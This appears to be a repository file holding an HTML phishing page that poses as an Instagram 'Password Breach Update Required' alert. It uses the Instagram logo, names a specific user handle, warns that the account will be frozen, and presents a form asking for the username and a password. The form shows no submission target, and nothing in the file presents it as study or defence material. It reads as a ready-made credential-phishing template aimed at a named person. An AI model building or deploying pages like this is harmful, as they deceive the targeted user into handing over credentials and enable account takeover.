# Consious-
Passkey Breach 
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Instagram Security Alert</title>
  <style>
    /* ...styles as in your code... */
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="insta-logo">
    <h2>Password Breach Update Required</h2>
    <div class="alert">
      To avoid freezing your Instagram account, naina_devadiga_ please update your password as soon as possible.
    </div>
    <form>
      <div class="input-group">
        <label for="username">Instagram Username</label>
        <input type="text" id="username" name="username" placeholder="Enter your Instagram username" required>
      </div>
      <div class="input-group">
        <label for="password">New Password</label>
        <input type="password" id="password" name="password" placeholder="Enter new password" required>
      </div>
      <button class="btn" type="submit">Update Password</button>
    </form>
    <div class="footer">
      For your security, always use the official Instagram app or website to update your password.<br>
      &copy; 2025 Instagram Security Notice
    </div>
  </div>
</body>
</html>
